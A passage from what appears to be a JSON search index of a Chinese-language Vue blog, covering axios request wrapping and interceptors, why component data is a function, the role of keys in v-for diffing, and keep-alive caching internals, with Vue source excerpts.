&#125;&#125;);\n\n九、接口封装处理\nvue中Axios的封装与API接口的管理详解\n\n9.1 axios的封装\n在vue项目中，和后台交互获取数据这块，我们通常使用的是axios库，它是基于promise的http库，可运行在浏览器端和node.js中。他有很多优秀的特性，例如拦截请求和响应、取消请求、转换json、客户端防御XSRF等\n\n\n一般我会在项目的src目录中，新建一个request文件夹，然后在里面新建一个http.js和一个api.js文件。http.js文件用来封装我们的axios，api.js用来统一管理我们的接口\n\n// 在http.js中引入axiosimport axios from &#x27;axios&#x27;; // 引入axiosimport QS from &#x27;qs&#x27;; // 引入qs模块，用来序列化post类型的数据，后面会提到// vant的toast提示框组件，大家可根据自己的ui组件更改。import &#123; Toast &#125; from &#x27;vant&#x27;;\n\n9.2 环境的切换\n我们的项目环境可能有开发环境、测试环境和生产环境。我们通过node的环境变量来匹配我们的默认的接口url前缀。axios.defaults.baseURL可以设置axios的默认请求地址就不多说了\n\n// 环境的切换if (process.env.NODE_ENV == &#x27;development&#x27;) &#123;  axios.defaults.baseURL = &#x27;https://www.baidu.com&#x27;;&#125; else if (process.env.NODE_ENV == &#x27;debug&#x27;) &#123;  axios.defaults.baseURL = &#x27;https://www.ceshi.com&#x27;;&#125; else if (process.env.NODE_ENV == &#x27;production&#x27;) &#123;  axios.defaults.baseURL = &#x27;https://www.production.com&#x27;;&#125;\n\n9.3 设置请求超时\n通过axios.defaults.timeout设置默认的请求超时时间。例如超过了10s，就会告知用户当前请求超时，请刷新等\n\naxios.defaults.timeout = 10000;\n\n\npost`请求头的设置`post`请求的时候，我们需要加上一个请求头，所以可以在这里进行一个默认的设置，即设置`post`的请求头为`application/x-www-form-urlencoded;charset=UTF-8\n\naxios.defaults.headers.post[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencode\n\n9.4 请求拦截\n我们在发送请求前可以进行一个请求的拦截，为什么要拦截呢，我们拦截请求是用来做什么的呢？比如，有些请求是需要用户登录之后才能访问的，或者post请求的时候，我们需要序列化我们提交的数据。这时候，我们可以在请求被发送之前进行一个拦截，从而进行我们想要的操作\n\n// 先导入vuex,因为我们要使用到里面的状态对象// vuex的路径根据自己的路径去写import store from &#x27;@/store/index&#x27;;// 请求拦截器axios.interceptors.request.use(  config =&gt; &#123;  // 每次发送请求之前判断vuex中是否存在token  // 如果存在，则统一在http请求的header都加上token，这样后台根据token判断你的登录情况 // 即使本地存在token，也有可能token是过期的，所以在响应拦截器中要对返回状态进行判断  const token = store.state.token;  token &amp;&amp; (config.headers.Authorization = token);  return config;  &#125;,  error =&gt; &#123;  return Promise.error(error); &#125;)\n\n\n一般是在登录完成之后，将用户的token通过localStorage或者cookie存在本地，然后用户每次在进入页面的时候（即在main.js中），会首先从本地存储中读取token，如果token存在说明用户已经登陆过，则更新vuex中的token状态。然后，在每次请求接口的时候，都会在请求的header中携带token，后台人员就可以根据你携带的token来判断你的登录是否过期，如果没有携带，则说明没有登录过。这时候或许有些小伙伴会有疑问了，就是每个请求都携带token，那么要是一个页面不需要用户登录就可以访问的怎么办呢？其实，你前端的请求可以携带token，但是后台可以选择不接收啊！\n\n9.5 响应的拦截// 响应拦截器axios.interceptors.response.use(  response =&gt; &#123;  // 如果返回的状态码为200，说明接口请求成功，可以正常拿到数据  // 否则的话抛出错误 if (response.status === 200) &#123;    return Promise.resolve(response);  &#125; else &#123;    return Promise.reject(response);  &#125;  &#125;,  // 服务器状态码不是2开头的的情况 // 这里可以跟你们的后台开发人员协商好统一的错误状态码  // 然后根据返回的状态码进行一些操作，例如登录过期提示，错误提示等等 // 下面列举几个常见的操作，其他需求可自行扩展 error =&gt; &#123;   if (error.response.status) &#123;    switch (error.response.status) &#123;    // 401: 未登录  // 未登录则跳转登录页面，并携带当前页面的路径  // 在登录成功后返回当前页面，这一步需要在登录页操作。    case 401:      router.replace(&#123;      path: &#x27;/login&#x27;,      query: &#123;     redirect: router.currentRoute.fullPath    &#125;   &#125;);   break;  // 403 token过期  // 登录过期对用户进行提示  // 清除本地token和清空vuex中token对象  // 跳转登录页面    case 403:   Toast(&#123;   message: &#x27;登录过期，请重新登录&#x27;,   duration: 1000,   forbidClick: true   &#125;);   // 清除token   localStorage.removeItem(&#x27;token&#x27;);   store.commit(&#x27;loginSuccess&#x27;, null);   // 跳转登录页面，并将要浏览的页面fullPath传过去，登录成功后跳转需要访问的页面    setTimeout(() =&gt; &#123;      router.replace(&#123;        path: &#x27;/login&#x27;,        query: &#123;     redirect: router.currentRoute.fullPath     &#125;      &#125;);      &#125;, 1000);      break;  // 404请求不存在  case 404:   Toast(&#123;   message: &#x27;网络请求不存在&#x27;,   duration: 1500,   forbidClick: true   &#125;);   break;  // 其他错误，直接抛出错误提示  default:   Toast(&#123;   message: error.response.data.message,   duration: 1500,   forbidClick: true   &#125;);  &#125;  return Promise.reject(error.response); &#125; &#125; &#125;);\n\n\n响应拦截器很好理解，就是服务器返回给我们的数据，我们在拿到之前可以对他进行一些处理。例如上面的思想：如果后台返回的状态码是200，则正常返回数据，否则的根据错误的状态码类型进行一些我们需要的错误，其实这里主要就是进行了错误的统一处理和没登录或登录过期后调整登录页的一个操作\n\n\n要注意的是，上面的Toast()方法，是我引入的vant库中的toast轻提示组件，你根据你的ui库，对应使用你的一个提示组件\n\n9.6 封装get方法和post方法\n我们常用的ajax请求方法有get、post、put等方法。axios对应的也有很多类似的方法，不清楚的可以看下文档。但是为了简化我们的代码，我们还是要对其进行一个简单的封装。下面我们主要封装两个方法：get和post\n\n\nget方法：我们通过定义一个get函数，get函数有两个参数，第一个参数表示我们要请求的url地址，第二个参数是我们要携带的请求参数。get函数返回一个promise对象，当axios其请求成功时resolve服务器返回值，请求失败时reject错误值。最后通过export抛出get函数\n\n/** * get方法，对应get请求 * @param &#123;String&#125; url [请求的url地址] * @param &#123;Object&#125; params [请求时携带的参数] */export function get(url, params)&#123;  return new Promise((resolve, reject) =&gt;&#123;  axios.get(url, &#123;    params: params  &#125;).then(res =&gt; &#123;  resolve(res.data); &#125;).catch(err =&gt;&#123;  reject(err.data)  &#125;) &#125;);&#125;\n\n\npost方法：原理同get基本一样，但是要注意的是，post方法必须要使用对提交从参数对象进行序列化的操作，所以这里我们通过node的qs模块来序列化我们的参数。这个很重要，如果没有序列化操作，后台是拿不到你提交的数据的\n\n/**  * post方法，对应post请求  * @param &#123;String&#125; url [请求的url地址]  * @param &#123;Object&#125; params [请求时携带的参数]  */export function post(url, params) &#123; return new Promise((resolve, reject) =&gt; &#123;  axios.post(url, QS.stringify(params)) .then(res =&gt; &#123;  resolve(res.data); &#125;) .catch(err =&gt;&#123;  reject(err.data) &#125;) &#125;);&#125;\n\n\naxios.get()方法和axios.post()在提交数据时参数的书写方式还是有区别的。区别就是，get的第二个参数是一个&#123;&#125;，然后这个对象的params属性值是一个参数对象的。而post的第二个参数就是一个参数对象\n\n9.7 api的统一管理\n首先我们在api.js中引入我们封装的get和post方法\n\n/**  * api接口统一管理 */import &#123; get, post &#125; from &#x27;./http&#x27;\n\n在api.js中\nexport const apiAddress = param =&gt; post(&#x27;api/v1/users&#x27;,param)\n\n在我们的页面中可以这样调用我们的api接口\nimport &#123; apiAddress &#125; from &#x27;@/request/api&#x27;;// 导入我们的api接口export default &#123;   name: &#x27;Address&#x27;,  created () &#123;  this.onLoad(); &#125;, methods: &#123;     // 获取数据     onLoad() &#123;   // 调用api接口，并且提供了两个参数       apiAddress(&#123;         type: 0,         sort: 1       &#125;).then(res =&gt; &#123;    // 获取数据成功后的其他操作    ………………       &#125;)     &#125;   &#125;&#125;\n\n9.8 完整封装代码/**axios封装 * 请求拦截、相应拦截、错误统一处理 */import axios from &#x27;axios&#x27;;import QS from &#x27;qs&#x27;;import &#123;\tToast&#125;from &#x27;vant&#x27;;import store from &#x27;../store/index&#x27;// 环境的切换if (process.env.NODE_ENV == &#x27;development&#x27;) &#123;\taxios.defaults.baseURL = &#x27;/api&#x27;;&#125; else if (process.env.NODE_ENV == &#x27;debug&#x27;) &#123;\taxios.defaults.baseURL = &#x27;&#x27;;&#125; else if (process.env.NODE_ENV == &#x27;production&#x27;) &#123;\taxios.defaults.baseURL = &#x27;http://api.123dailu.com/&#x27;;&#125;// 请求超时时间axios.defaults.timeout = 10000;// post请求头axios.defaults.headers.post[&#x27;Content-Type&#x27;] = &#x27;application/x-www-form-urlencoded;charset=UTF-8&#x27;;// 请求拦截器axios.interceptors.request.use(config = &gt; &#123;\t// 每次发送请求之前判断是否存在token，如果存在，则统一在http请求的header都加上token，不用每次请求都手动添加了\t// 即使本地存在token，也有可能token是过期的，所以在响应拦截器中要对返回状态进行判断\tconst token = store.state.token;\ttoken &amp;&amp; (config.headers.Authorization = token);\treturn config;&#125;, error = &gt; &#123;\treturn Promise.error(error);&#125;)// 响应拦截器axios.interceptors.response.use(response = &gt; &#123;\tif (response.status === 200) &#123;\t\treturn Promise.resolve(response);\t&#125; else &#123;\t\treturn Promise.reject(response);\t&#125;&#125;,// 服务器状态码不是200的情况 error = &gt; &#123;\tif (error.response.status) &#123;\t\tswitch (error.response.status) &#123;\t\t\t// 401: 未登录    \t\t\t// 未登录则跳转登录页面，并携带当前页面的路径    \t\t\t// 在登录成功后返回当前页面，这一步需要在登录页操作。    \t\tcase 401:\t\t\trouter.replace(&#123;\t\t\t\tpath: &#x27;/login&#x27;,\t\t\t\tquery: &#123;\t\t\t\t\tredirect: router.currentRoute.fullPath\t\t\t\t&#125;\t\t\t&#125;);\t\t\tbreak;\t\t\t// 403 token过期    \t\t\t// 登录过期对用户进行提示    \t\t\t// 清除本地token和清空vuex中token对象    \t\t\t// 跳转登录页面    \t\tcase 403:\t\t\tToast(&#123;\t\t\t\tmessage: &#x27;登录过期，请重新登录&#x27;,\t\t\t\tduration: 1000,\t\t\t\tforbidClick: true\t\t\t&#125;);\t\t\t// 清除token     \t\t\tlocalStorage.removeItem(&#x27;token&#x27;);\t\t\tstore.commit(&#x27;loginSuccess&#x27;, null);\t\t\t// 跳转登录页面，并将要浏览的页面fullPath传过去，登录成功后跳转需要访问的页面\t\t\tsetTimeout(() = &gt; &#123;\t\t\t\trouter.replace(&#123;\t\t\t\t\tpath: &#x27;/login&#x27;,\t\t\t\t\tquery: &#123;\t\t\t\t\t\tredirect: router.currentRoute.fullPath\t\t\t\t\t&#125;\t\t\t\t&#125;);\t\t\t&#125;, 1000);\t\t\tbreak;\t\t\t// 404请求不存在    \t\tcase 404:\t\t\tToast(&#123;\t\t\t\tmessage: &#x27;网络请求不存在&#x27;,\t\t\t\tduration: 1500,\t\t\t\tforbidClick: true\t\t\t&#125;);\t\t\tbreak;\t\t\t// 其他错误，直接抛出错误提示    \t\tdefault:\t\t\tToast(&#123;\t\t\t\tmessage: error.response.data.message,\t\t\t\tduration: 1500,\t\t\t\tforbidClick: true\t\t\t&#125;);\t\t&#125;\t\treturn Promise.reject(error.response);\t&#125;&#125;);/**  * get方法，对应get请求 * @param &#123;String&#125; url [请求的url地址] * @param &#123;Object&#125; params [请求时携带的参数] */exportfunction get(url, params) &#123;\treturn new Promise((resolve, reject) = &gt; &#123;\t\taxios.get(url, &#123;\t\t\tparams: params\t\t&#125;).then(res = &gt; &#123;\t\t\tresolve(res.data);\t\t&#125;).\t\tcatch (err = &gt; &#123;\t\t\treject(err.data)\t\t&#125;)\t&#125;);&#125;/**  * post方法，对应post请求 * @param &#123;String&#125; url [请求的url地址] * @param &#123;Object&#125; params [请求时携带的参数] */exportfunction post(url, params) &#123;\treturn new Promise((resolve, reject) = &gt; &#123;\t\taxios.post(url, QS.stringify(params)).then(res = &gt; &#123;\t\t\tresolve(res.data);\t\t&#125;).\t\tcatch (err = &gt; &#123;\t\t\treject(err.data)\t\t&#125;)\t&#125;);&#125;","categories":["框架"],"tags":["vue"]},{"title":"vue-data属性是一个函数而不是一个对象","url":"/2018/06/23/Vue/vue-data%E5%B1%9E%E6%80%A7%E6%98%AF%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E8%80%8C%E4%B8%8D%E6%98%AF%E4%B8%80%E4%B8%AA%E5%AF%B9%E8%B1%A1/","content":"一、实例和组件定义data的区别vue实例的时候定义data属性既可以是一个对象，也可以是一个函数\nconst app = new Vue(&#123;    el:&quot;#app&quot;,    // 对象格式    data:&#123;        foo:&quot;foo&quot;    &#125;,    // 函数格式    data()&#123;        return &#123;             foo:&quot;foo&quot;        &#125;    &#125;&#125;)\n\n组件中定义data属性，只能是一个函数\n如果为组件data直接定义为一个对象\nVue.component(&#x27;component1&#x27;,&#123;    template:`&lt;div&gt;组件&lt;/div&gt;`,    data:&#123;        foo:&quot;foo&quot;    &#125;&#125;)\n\n则会得到警告信息\n\n警告说明：返回的data应该是一个函数在每一个组件实例中\n二、组件data定义函数与对象的区别上面讲到组件data必须是一个函数，不知道大家有没有思考过这是为什么呢？\n在我们定义好一个组件的时候，vue最终都会通过Vue.extend()构成组件实例\n这里我们模仿组件构造函数，定义data属性，采用对象的形式\nfunction Component()&#123; &#125;Component.prototype.data = &#123;\tcount : 0&#125;\n\n两个组件实例\nconst componentA = new Component()const componentB = new Component()\n\n修改componentA组件data属性的值，componentB中的值也发生了改变\nconsole.log(componentB.data.count)  // 0componentA.data.count = 1console.log(componentB.data.count)  // 1\n\n产生这样的原因这是两者共用了同一个内存地址，componentA修改的内容，同样对componentB产生了影响\n如果我们采用函数的形式，则不会出现这种情况（函数返回的对象内存地址并不相同）\nfunction Component()&#123;\tthis.data = this.data()&#125;Component.prototype.data = function ()&#123;    return &#123;   \t\tcount : 0    &#125;&#125;\n\n修改componentA组件data属性的值，componentB中的值不受影响\nconsole.log(componentB.data.count)  // 0componentA.data.count = 1console.log(componentB.data.count)  // 0\n\nvue组件可能会有很多个实例，采用函数返回一个全新data形式，使每个实例对象的数据不会受到其他实例对象数据的污染\n三、原理分析首先可以看看vue初始化data的代码，data的定义可以是函数也可以是对象\n源码位置：/vue-dev/src/core/instance/state.js\nfunction initData (vm: Component) &#123;  let data = vm.$options.data  data = vm._data = typeof data === &#x27;function&#x27;    ? getData(data, vm)    : data || &#123;&#125;    ...&#125;\n\ndata既能是object也能是function，那为什么还会出现上文警告呢？\n别急，继续看下文\n组件在创建的时候，会进行选项的合并\n源码位置：/vue-dev/src/core/util/options.js\n自定义组件会进入mergeOptions进行选项合并\nVue.prototype._init = function (options?: Object) &#123;    ...    // merge options    if (options &amp;&amp; options._isComponent) &#123;      // optimize internal component instantiation      // since dynamic options merging is pretty slow, and none of the      // internal component options needs special treatment.      initInternalComponent(vm, options)    &#125; else &#123;      vm.$options = mergeOptions(        resolveConstructorOptions(vm.constructor),        options || &#123;&#125;,        vm      )    &#125;    ...  &#125;\n\n定义data会进行数据校验\n源码位置：/vue-dev/src/core/instance/init.js\n这时候vm实例为undefined，进入if判断，若data类型不是function，则出现警告提示\nstrats.data = function (  parentVal: any,  childVal: any,  vm?: Component): ?Function &#123;  if (!vm) &#123;    if (childVal &amp;&amp; typeof childVal !== &quot;function&quot;) &#123;      process.env.NODE_ENV !== &quot;production&quot; &amp;&amp;        warn(          &#x27;The &quot;data&quot; option should be a function &#x27; +            &quot;that returns a per-instance value in component &quot; +            &quot;definitions.&quot;,          vm        );      return parentVal;    &#125;    return mergeDataOrFn(parentVal, childVal);  &#125;  return mergeDataOrFn(parentVal, childVal, vm);&#125;;\n\n\n\n四、结论\n根实例对象data可以是对象也可以是函数（根实例是单例），不会产生数据污染情况\n组件实例对象data必须为函数，目的是为了防止多个组件实例对象之间共用一个data，产生数据污染。采用函数的形式，initData时会将其作为工厂函数都会返回全新data对象\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-key值作用","url":"/2018/06/27/Vue/vue-key%E5%80%BC%E4%BD%9C%E7%94%A8/","content":"一、Key是什么开始之前，我们先还原两个实际工作场景\n\n当我们在使用v-for时，需要给单元加上key\n\n&lt;ul&gt;    &lt;li v-for=&quot;item in items&quot; :key=&quot;item.id&quot;&gt;...&lt;/li&gt;&lt;/ul&gt;\n\n\n用+new Date()生成的时间戳作为key，手动强制触发重新渲染\n\n&lt;Comp :key=&quot;+new Date()&quot; /&gt;\n\n那么这背后的逻辑是什么，key的作用又是什么？\n一句话来讲\n\nkey是给每一个vnode的唯一id，也是diff的一种优化策略，可以根据key，更准确， 更快的找到对应的vnode节点\n\n场景背后的逻辑当我们在使用v-for时，需要给单元加上key\n\n如果不用key，Vue会采用就地复地原则：最小化element的移动，并且会尝试尽最大程度在同适当的地方对相同类型的element，做patch或者reuse。\n如果使用了key，Vue会根据keys的顺序记录element，曾经拥有了key的element如果不再出现的话，会被直接remove或者destoryed\n\n用+new Date()生成的时间戳作为key，手动强制触发重新渲染\n\n当拥有新值的rerender作为key时，拥有了新key的Comp出现了，那么旧key Comp会被移除，新key Comp触发渲染\n\n二、设置key与不设置key区别举个例子：\n创建一个实例，2秒后往items数组插入数据\n&lt;body&gt;  &lt;div id=&quot;demo&quot;&gt;    &lt;p v-for=&quot;item in items&quot; :key=&quot;item&quot;&gt;&#123;&#123;item&#125;&#125;&lt;/p&gt;  &lt;/div&gt;  &lt;script src=&quot;../../dist/vue.js&quot;&gt;&lt;/script&gt;  &lt;script&gt;    // 创建实例    const app = new Vue(&#123;      el: &#x27;#demo&#x27;,      data: &#123; items: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;] &#125;,      mounted () &#123;        setTimeout(() =&gt; &#123;           this.items.splice(2, 0, &#x27;f&#x27;)  //        &#125;, 2000);     &#125;,   &#125;);  &lt;/script&gt;&lt;/body&gt;\n\n在不使用key的情况，vue会进行这样的操作：\n\n分析下整体流程：\n\n比较A，A，相同类型的节点，进行patch，但数据相同，不发生dom操作\n比较B，B，相同类型的节点，进行patch，但数据相同，不发生dom操作\n比较C，F，相同类型的节点，进行patch，数据不同，发生dom操作\n比较D，C，相同类型的节点，进行patch，数据不同，发生dom操作\n比较E，D，相同类型的节点，进行patch，数据不同，发生dom操作\n循环结束，将E插入到DOM中\n\n一共发生了3次更新，1次插入操作\n在使用key的情况：vue会进行这样的操作：\n\n比较A，A，相同类型的节点，进行patch，但数据相同，不发生dom操作\n比较B，B，相同类型的节点，进行patch，但数据相同，不发生dom操作\n比较C，F，不相同类型的节点\n比较E、E，相同类型的节点，进行patch，但数据相同，不发生dom操作\n\n\n比较D、D，相同类型的节点，进行patch，但数据相同，不发生dom操作\n比较C、C，相同类型的节点，进行patch，但数据相同，不发生dom操作\n循环结束，将F插入到C之前\n\n一共发生了0次更新，1次插入操作\n通过上面两个小例子，可见设置key能够大大减少对页面的DOM操作，提高了diff效率\n设置key值一定能提高diff效率吗？其实不然，文档中也明确表示\n\n当 Vue.js 用 v-for 正在更新已渲染过的元素列表时，它默认用“就地复用”策略。如果数据项的顺序被改变，Vue 将不会移动 DOM 元素来匹配数据项的顺序， 而是简单复用此处每个元素，并且确保它在特定索引下显示已被渲染过的每个元素\n\n这个默认的模式是高效的，但是只适用于不依赖子组件状态或临时 DOM 状态 (例如：表单输入值) 的列表渲染输出\n建议尽可能在使用 v-for 时提供 key，除非遍历输出的 DOM 内容非常简单，或者是刻意依赖默认行为以获取性能上的提升\n三、原理分析源码位置：core&#x2F;vdom&#x2F;patch.js\n这里判断是否为同一个key，首先判断的是key值是否相等如果没有设置key，那么key为undefined，这时候undefined是恒等于undefined\nfunction sameVnode (a, b) &#123;    return (        a.key === b.key &amp;&amp; (            (                a.tag === b.tag &amp;&amp;                a.isComment === b.isComment &amp;&amp;                isDef(a.data) === isDef(b.data) &amp;&amp;                sameInputType(a, b)            ) || (                isTrue(a.isAsyncPlaceholder) &amp;&amp;                a.asyncFactory === b.asyncFactory &amp;&amp;                isUndef(b.asyncFactory.error)            )        )    )&#125;\n\nupdateChildren`方法中会对新旧`vnode`进行`diff`，然后将比对出的结果用来更新真实的`DOMfunction updateChildren (parentElm, oldCh, newCh, insertedVnodeQueue, removeOnly) &#123;    ...    while (oldStartIdx &lt;= oldEndIdx &amp;&amp; newStartIdx &lt;= newEndIdx) &#123;        if (isUndef(oldStartVnode)) &#123;            ...        &#125; else if (isUndef(oldEndVnode)) &#123;            ...        &#125; else if (sameVnode(oldStartVnode, newStartVnode)) &#123;            ...        &#125; else if (sameVnode(oldEndVnode, newEndVnode)) &#123;            ...        &#125; else if (sameVnode(oldStartVnode, newEndVnode)) &#123; // Vnode moved right            ...        &#125; else if (sameVnode(oldEndVnode, newStartVnode)) &#123; // Vnode moved left            ...        &#125; else &#123;            if (isUndef(oldKeyToIdx)) oldKeyToIdx = createKeyToOldIdx(oldCh, oldStartIdx, oldEndIdx)            idxInOld = isDef(newStartVnode.key)                ? oldKeyToIdx[newStartVnode.key]                : findIdxInOld(newStartVnode, oldCh, oldStartIdx, oldEndIdx)            if (isUndef(idxInOld)) &#123; // New element                createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm, false, newCh, newStartIdx)            &#125; else &#123;                vnodeToMove = oldCh[idxInOld]                if (sameVnode(vnodeToMove, newStartVnode)) &#123;                    patchVnode(vnodeToMove, newStartVnode, insertedVnodeQueue, newCh, newStartIdx)                    oldCh[idxInOld] = undefined                    canMove &amp;&amp; nodeOps.insertBefore(parentElm, vnodeToMove.elm, oldStartVnode.elm)                &#125; else &#123;                    // same key but different element. treat as new element                    createElm(newStartVnode, insertedVnodeQueue, parentElm, oldStartVnode.elm, false, newCh, newStartIdx)                &#125;            &#125;            newStartVnode = newCh[++newStartIdx]        &#125;    &#125;    ...&#125;","categories":["框架"],"tags":["vue"]},{"title":"vue-keep-alive缓存组件","url":"/2018/06/25/Vue/vue-keep-alive%E7%BC%93%E5%AD%98%E7%BB%84%E4%BB%B6/","content":"一、Keep-alive 是什么keep-alive`是`vue`中的内置组件，能在组件切换过程中将状态保留在内存中，防止重复渲染`DOM\n\nkeep-alive 包裹动态组件时，会缓存不活动的组件实例，而不是销毁它们\nkeep-alive可以设置以下props属性：\n\ninclude - 字符串或正则表达式。只有名称匹配的组件会被缓存\nexclude - 字符串或正则表达式。任何名称匹配的组件都不会被缓存\nmax - 数字。最多可以缓存多少组件实例\n\n关于keep-alive的基本用法：\n&lt;keep-alive&gt;  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;&lt;/keep-alive&gt;\n\n使用includes和exclude：\n&lt;keep-alive include=&quot;a,b&quot;&gt;  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;&lt;/keep-alive&gt;&lt;!-- 正则表达式 (使用 `v-bind`) --&gt;&lt;keep-alive :include=&quot;/a|b/&quot;&gt;  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;&lt;/keep-alive&gt;&lt;!-- 数组 (使用 `v-bind`) --&gt;&lt;keep-alive :include=&quot;[&#x27;a&#x27;, &#x27;b&#x27;]&quot;&gt;  &lt;component :is=&quot;view&quot;&gt;&lt;/component&gt;&lt;/keep-alive&gt;\n\n匹配首先检查组件自身的 name 选项，如果 name 选项不可用，则匹配它的局部注册名称 (父组件 components 选项的键值)，匿名组件不能被匹配\n设置了 keep-alive 缓存的组件，会多出两个生命周期钩子（activated与deactivated）：\n\n首次进入组件时：beforeRouteEnter &gt; beforeCreate &gt; created&gt; mounted &gt; activated &gt; … … &gt; beforeRouteLeave &gt; deactivated\n再次进入组件时：beforeRouteEnter &gt;activated &gt; … … &gt; beforeRouteLeave &gt; deactivated\n\n二、使用场景使用原则：当我们在某些场景下不需要让页面重新加载时我们可以使用keepalive\n举个栗子:\n当我们从首页–&gt;列表页–&gt;商详页–&gt;再返回，这时候列表页应该是需要keep-alive\n从首页–&gt;列表页–&gt;商详页–&gt;返回到列表页(需要缓存)–&gt;返回到首页(需要缓存)–&gt;再次进入列表页(不需要缓存)，这时候可以按需来控制页面的keep-alive\n在路由中设置keepAlive属性判断是否需要缓存\n&#123;  path: &#x27;list&#x27;,  name: &#x27;itemList&#x27;, // 列表页  component (resolve) &#123;    require([&#x27;@/pages/item/list&#x27;], resolve) &#125;, meta: &#123;  keepAlive: true,  title: &#x27;列表页&#x27; &#125;&#125;\n\n&lt;div id=&quot;app&quot; class=&#x27;wrapper&#x27;&gt;    &lt;keep-alive&gt;        &lt;!-- 需要缓存的视图组件 --&gt;         &lt;router-view v-if=&quot;$route.meta.keepAlive&quot;&gt;&lt;/router-view&gt;     &lt;/keep-alive&gt;      &lt;!-- 不需要缓存的视图组件 --&gt;     &lt;router-view v-if=&quot;!$route.meta.keepAlive&quot;&gt;&lt;/router-view&gt;&lt;/div&gt;\n\n三、原理分析keep-alive是vue中内置的一个组件\n源码位置：src&#x2F;core&#x2F;components&#x2F;keep-alive.js\nexport default &#123;  name: &#x27;keep-alive&#x27;,  abstract: true,  props: &#123;    include: [String, RegExp, Array],    exclude: [String, RegExp, Array],    max: [String, Number]  &#125;,  created () &#123;    this.cache = Object.create(null)    this.keys = []  &#125;,  destroyed () &#123;    for (const key in this.cache) &#123;      pruneCacheEntry(this.cache, key, this.keys)    &#125;  &#125;,  mounted () &#123;    this.$watch(&#x27;include&#x27;, val =&gt; &#123;      pruneCache(this, name =&gt; matches(val, name))    &#125;)    this.$watch(&#x27;exclude&#x27;, val =&gt; &#123;      pruneCache(this, name =&gt; !matches(val, name))    &#125;)  &#125;,  render() &#123;    /* 获取默认插槽中的第一个组件节点 */    const slot = this.$slots.default    const vnode = getFirstComponentChild(slot)    /* 获取该组件节点的componentOptions */    const componentOptions = vnode &amp;&amp; vnode.componentOptions    if (componentOptions) &#123;      /* 获取该组件节点的名称，优先获取组件的name字段，如果name不存在则获取组件的tag */      const name = getComponentName(componentOptions)      const &#123; include, exclude &#125; = this      /* 如果name不在inlcude中或者存在于exlude中则表示不缓存，直接返回vnode */      if (        (include &amp;&amp; (!name || !matches(include, name))) ||        // excluded        (exclude &amp;&amp; name &amp;&amp; matches(exclude, name))      ) &#123;        return vnode      &#125;      const &#123; cache, keys &#125; = this      /* 获取组件的key值 */      const key = vnode.key == null        // same constructor may get registered as different local components        // so cid alone is not enough (#3269)        ? componentOptions.Ctor.cid + (componentOptions.tag ? `::$&#123;componentOptions.tag&#125;` : &#x27;&#x27;)        : vnode.key     /*  拿到key值后去this.cache对象中去寻找是否有该值，如果有则表示该组件有缓存，即命中缓存 */      if (cache[key]) &#123;        vnode.componentInstance = cache[key].componentInstance        // make current key freshest        remove(keys, key)        keys.push(key)      &#125;        /* 如果没有命中缓存，则将其设置进缓存 */        else &#123;        cache[key] = vnode        keys.push(key)        // prune oldest entry        /* 如果配置了max并且缓存的长度超过了this.max，则从缓存中删除第一个 */        if (this.max &amp;&amp; keys.length &gt; parseInt(this.max)) &#123;          pruneCacheEntry(cache, keys[0], keys, this._vnode)        &#125;      &#125;      vnode.data.keepAlive = true    &#125;    return vnode || (slot &amp;&amp; slot[0])  &#125;&#125;\n\n可以看到该组件没有template，而是用了render，在组件渲染的时候会自动执行render函数\nthis.cache是一个对象，用来存储需要缓存的组件，它将以如下形式存储：\nthis.cache = &#123;    &#x27;key1&#x27;:&#x27;组件1&#x27;,    &#x27;key2&#x27;:&#x27;组件2&#x27;,    // ...&#125;\n\n在组件销毁的时候执行pruneCacheEntry函数\nfunction pruneCacheEntry (  cache: VNodeCache,  key: string,  keys: Array&lt;string&gt;,  current?: VNode) &#123;  const cached = cache[key]  /* 判断当前没有处于被渲染状态的组件，将其销毁*/  if (cached &amp;&amp; (!current || cached.tag !== current.tag)) &#123;    cached.componentInstance.$destroy()  &#125;  cache[key] = null  remove(keys, key)&#125;\n\n在mounted钩子函数中观测 include 和 exclude 的变化，如下：\nmounted () &#123;    this.$watch(&#x27;include&#x27;, val =&gt; &#123;        pruneCache(this, name =&gt; matches(val, name))    &#125;)    this.$watch(&#x27;exclude&#x27;, val =&gt; &#123;        pruneCache(this, name =&gt; !matches(val, name))    &#125;)&#125;\n\n如果include 或exclude 发生了变化，即表示定义需要缓存的组件的规则或者不需要缓存的组件的规则发生了变化，那么就执行pruneCache函数，函数如下：\nfunction pruneCache (keepAliveInstance, filter) &#123;  const &#123; cache, keys, _vnode &#125; = keepAliveInstance  for (const key in cache) &#123;    const cachedNode = cache[key]    if (cachedNode) &#123;      const name = getComponentName(cachedNode.componentOptions)      if (name &amp;&amp; !filter(name)) &#123;        pruneCacheEntry(cache, key, keys, _vnode)      &#125;    &#125;  &#125;&#125;\n\n在该函数内对this.cache对象进行遍历，取出每一项的name值，用其与新的缓存规则进行匹配，如果匹配不上，则表示在新的缓存规则下该组件已经不需要被缓存，则调用pruneCacheEntry函数将其从this.cache对象剔除即可\n关于keep-alive的最强大缓存功能是在render函数中实现\n首先获取组件的key值：\nconst key = vnode.key == null? componentOptions.Ctor.cid + (componentOptions.tag ? `::$&#123;componentOptions.tag&#125;` : &#x27;&#x27;): vnode.key\n\n拿到key值后去this.cache对象中去寻找是否有该值，如果有则表示该组件有缓存，即命中缓存，如下：\n/* 如果命中缓存，则直接从缓存中拿 vnode 的组件实例 */if (cache[key]) &#123;    vnode.componentInstance = cache[key].componentInstance    /* 调整该组件key的顺序，将其从原来的地方删掉并重新放在最后一个 */    remove(keys, key)    keys.push(key)&#125; \n\n直接从缓存中拿 vnode 的组件实例，此时重新调整该组件key的顺序，将其从原来的地方删掉并重新放在this.keys中最后一个\nthis.cache对象中没有该key值的情况，如下：\n/* 如果没有命中缓存，则将其设置进缓存 */else &#123;    cache[key] = vnode    keys.push(key)    /* 如果配置了max并且缓存的长度超过了this.max，则从缓存中删除第一个 */    if (this.max &amp;&amp; keys.length &gt; parseInt(this.max)) &#123;        pruneCacheEntry(cache, keys[0], keys, this._vnode)    